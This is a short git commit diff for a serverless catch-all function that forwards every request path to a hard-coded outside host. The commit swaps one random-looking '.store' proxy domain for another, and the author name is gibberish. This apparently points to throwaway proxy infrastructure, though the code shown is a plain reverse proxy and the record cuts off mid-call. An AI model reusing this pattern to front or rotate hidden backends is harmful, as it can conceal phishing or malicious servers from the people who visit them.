03fa022c7fa844f7bbaf6c26148e58db2e887676
lkdvnfklvfdd <spanishgray45@iwristlu.com>
2024-10-03 12:24:37 +0200

    Update [[path]].js

--- functions/[[path]].js
+++ functions/[[path]].js
@@ -1,7 +1,7 @@
 export async function onRequest({ request }) {
 	const url = new URL(request.url)
 
-	const proxyUrl = 'https://fdtbrtbrtf.store'
+	const proxyUrl = 'https://hfnghmn.store'
 	const backendUrl = `${proxyUrl}${url.pathname}`
 
 	const response = await fetch(backendUrl, {
